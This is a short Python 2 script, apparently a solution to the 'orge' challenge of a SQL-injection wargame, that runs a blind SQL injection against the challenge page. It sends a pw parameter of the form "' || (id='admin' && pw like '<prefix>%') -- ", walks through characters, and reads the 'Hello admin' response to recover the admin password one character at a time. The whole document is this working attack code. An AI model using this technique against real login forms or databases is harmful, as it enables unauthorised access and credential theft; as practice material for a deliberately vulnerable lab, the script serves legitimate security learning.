import requests

start=ord('0')
end=ord('Z')
value = ""
i = start

url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php"
cookies = {"PHPSESSID":""}

while 1:
	sql = "\' || (id=\'admin\' && pw like \'"+value+chr(i)+"%\') -- \'"
	params = {'pw':sql}
	r = requests.get(url, params=params, cookies=cookies)
	print sql

	i += 1
	if i == 37:
		i+=1

	if r.text.find("Hello admin") != -1:
		value += chr(i-1)
		i=start
		print "value : "+value
	if i>end:
		break

print "finished : " + value
